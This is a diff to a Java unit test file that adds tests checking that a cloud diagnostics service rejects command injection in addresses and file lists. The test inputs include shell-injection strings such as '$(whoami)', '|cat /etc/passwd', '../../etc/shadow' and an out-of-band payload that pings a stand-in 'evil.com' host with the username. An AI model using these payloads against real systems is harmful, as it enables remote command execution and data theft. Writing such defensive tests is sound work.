@@ -39,7 +39,10 @@ import org.mockito.Mock;
 import org.mockito.Mockito;
 import org.mockito.junit.MockitoJUnitRunner;
 
+import java.util.ArrayList;
+import java.util.Arrays;
 import java.util.HashMap;
+import java.util.List;
 import java.util.Map;
 
 @RunWith(MockitoJUnitRunner.class)
@@ -168,6 +171,43 @@ public class DiagnosticsServiceImplTest extends TestCase {
         serviceImpl.runDiagnosticsCommand(runDiagnosticsCmd);
     }
 
+    @Test(expected = InvalidParameterValueException.class)
+    public void testRunDiagnosticsRejectsSemicolonInjection() throws Exception {
+        Mockito.when(runDiagnosticsCmd.getAddress()).thenReturn("127.0.0.1;id");
+        serviceImpl.runDiagnosticsCommand(runDiagnosticsCmd);
+    }
+
+    @Test(expected = InvalidParameterValueException.class)
+    public void testRunDiagnosticsRejectsCommandSubstitution() throws Exception {
+        Mockito.when(runDiagnosticsCmd.getAddress()).thenReturn("127.0.0.1$(whoami)");
+        serviceImpl.runDiagnosticsCommand(runDiagnosticsCmd);
+    }
+
+    @Test(expected = InvalidParameterValueException.class)
+    public void testRunDiagnosticsRejectsBacktickInjection() throws Exception {
+        Mockito.when(runDiagnosticsCmd.getAddress()).thenReturn("127.0.0.1`id`");
+        serviceImpl.runDiagnosticsCommand(runDiagnosticsCmd);
+    }
+
+    @Test(expected = InvalidParameterValueException.class)
+    public void testRunDiagnosticsRejectsOASTPayload() throws Exception {
+        Mockito.when(runDiagnosticsCmd.getAddress()).thenReturn(
+                "127.0.0.1 -c 1;ping${IFS}-c${IFS}1${IFS}$(whoami).rundiag-rce.evil.com;#");
+        serviceImpl.runDiagnosticsCommand(runDiagnosticsCmd);
+    }
+
+    @Test(expected = InvalidParameterValueException.class)
+    public void testRunDiagnosticsRejectsPipeInjection() throws Exception {
+        Mockito.when(runDiagnosticsCmd.getAddress()).thenReturn("127.0.0.1|id");
+        serviceImpl.runDiagnosticsCommand(runDiagnosticsCmd);
+    }
+
+    @Test(expected = InvalidParameterValueException.class)
+    public void testRunDiagnosticsRejectsSpaceWithExtraArgs() throws Exception {
+        Mockito.when(runDiagnosticsCmd.getAddress()).thenReturn("127.0.0.1 -c 1;touch /tmp/rce;#");
+        serviceImpl.runDiagnosticsCommand(runDiagnosticsCmd);
+    }
+
     @Test
     public void testInvalidCharsInParams() throws Exception {
         assertFalse(serviceImpl.hasValidChars("'\\''"));
@@ -191,6 +231,99 @@ public class DiagnosticsServiceImplTest extends TestCase {
         assertTrue(serviceImpl.hasValidChars(" --back -m20 "));
         assertTrue(serviceImpl.hasValidChars("-c 5 -4"));
         assertTrue(serviceImpl.hasValidChars("-c 5 -4 -AbDfhqUV"));
+    }
+
+    @Test
+    public void testValidIpOrHostname() throws Exception {
+        assertTrue(serviceImpl.isValidIpOrHostname("8.8.8.8"));
+        assertTrue(serviceImpl.isValidIpOrHostname("192.168.1.1"));
+        assertTrue(serviceImpl.isValidIpOrHostname("google.com"));
+        assertTrue(serviceImpl.isValidIpOrHostname("www.google.com"));
+        assertTrue(serviceImpl.isValidIpOrHostname("sub.domain.example.com"));
+    }
+
+    @Test
+    public void testInvalidIpOrHostname() throws Exception {
+        assertFalse(serviceImpl.isValidIpOrHostname(null));
+        assertFalse(serviceImpl.isValidIpOrHostname(""));
+        assertFalse(serviceImpl.isValidIpOrHostname(" "));
+        assertFalse(serviceImpl.isValidIpOrHostname("127.0.0.1;id"));
+        assertFalse(serviceImpl.isValidIpOrHostname("127.0.0.1$(whoami)"));
+        assertFalse(serviceImpl.isValidIpOrHostname("127.0.0.1`id`"));
+        assertFalse(serviceImpl.isValidIpOrHostname("127.0.0.1|id"));
+        assertFalse(serviceImpl.isValidIpOrHostname("host;cmd"));
+        assertFalse(serviceImpl.isValidIpOrHostname("127.0.0.1 -c 1;touch /tmp/rce;#"));
+    }
+
+    @Test
+    public void testPrepareShellCmdRejectsInjectedIpAddress() throws Exception {
+        assertNull(serviceImpl.prepareShellCmd("ping", "127.0.0.1;id", null));
+        assertNull(serviceImpl.prepareShellCmd("ping", "127.0.0.1$(whoami)", null));
+        assertNull(serviceImpl.prepareShellCmd("ping", "127.0.0.1`id`", null));
+        assertNull(serviceImpl.prepareShellCmd("ping", "127.0.0.1|cat /etc/passwd", null));
+        assertNull(serviceImpl.prepareShellCmd("ping",
+                "127.0.0.1 -c 1;ping${IFS}-c${IFS}1${IFS}$(whoami).evil.com;#", null));
+    }
+
+    @Test
+    public void testPrepareShellCmdAllowsValidIpAddress() throws Exception {
+        assertEquals("ping 8.8.8.8", serviceImpl.prepareShellCmd("ping", "8.8.8.8", null));
+        assertEquals("ping google.com", serviceImpl.prepareShellCmd("ping", "google.com", null));
+        assertEquals("traceroute 10.0.0.1 -m 20",
+                serviceImpl.prepareShellCmd("traceroute", "10.0.0.1", "-m 20"));
+    }
+
+    @Test
+    public void testValidateDiagnosticsFilesListAcceptsValidPaths() throws Exception {
+        List<String> validFiles = Arrays.asList(
+                "/var/log/cloud.log",
+                "/etc/cloudstack-release",
+                "iptables",
+                "ipaddr",
+                "/usr/local/cloud/systemvm/conf/agent.properties"
+        );
+        serviceImpl.validateDiagnosticsFilesList(validFiles);
+    }
+
+    @Test
+    public void testValidateDiagnosticsFilesListAcceptsNull() throws Exception {
+        serviceImpl.validateDiagnosticsFilesList(null);
+    }
+
+    @Test
+    public void testValidateDiagnosticsFilesListAcceptsEmpty() throws Exception {
+        serviceImpl.validateDiagnosticsFilesList(new ArrayList<>());
+    }
+
+    @Test(expected = InvalidParameterValueException.class)
+    public void testValidateDiagnosticsFilesListRejectsSemicolon() throws Exception {
+        serviceImpl.validateDiagnosticsFilesList(Arrays.asList(
+                "diagnostics.py ping 127.0.0.1 -c 1; ping whoami.evil.com -c 1"));
+    }
+
+    @Test(expected = InvalidParameterValueException.class)
+    public void testValidateDiagnosticsFilesListRejectsCommandSubstitution() throws Exception {
+        serviceImpl.validateDiagnosticsFilesList(Arrays.asList("$(whoami)"));
+    }
+
+    @Test(expected = InvalidParameterValueException.class)
+    public void testValidateDiagnosticsFilesListRejectsBacktick() throws Exception {
+        serviceImpl.validateDiagnosticsFilesList(Arrays.asList("`id`"));
+    }
+
+    @Test(expected = InvalidParameterValueException.class)
+    public void testValidateDiagnosticsFilesListRejectsPipe() throws Exception {
+        serviceImpl.validateDiagnosticsFilesList(Arrays.asList("/var/log/cloud.log|id"));
+    }
+
+    @Test(expected = InvalidParameterValueException.class)
+    public void testValidateDiagnosticsFilesListRejectsPathTraversal() throws Exception {
+        serviceImpl.validateDiagnosticsFilesList(Arrays.asList("../../etc/shadow"));
+    }
+
+    @Test(expected = InvalidParameterValueException.class)
+    public void testValidateDiagnosticsFilesListRejectsSpaces() throws Exception {
+        serviceImpl.validateDiagnosticsFilesList(Arrays.asList("/var/log/file name"));
     }
 
 }
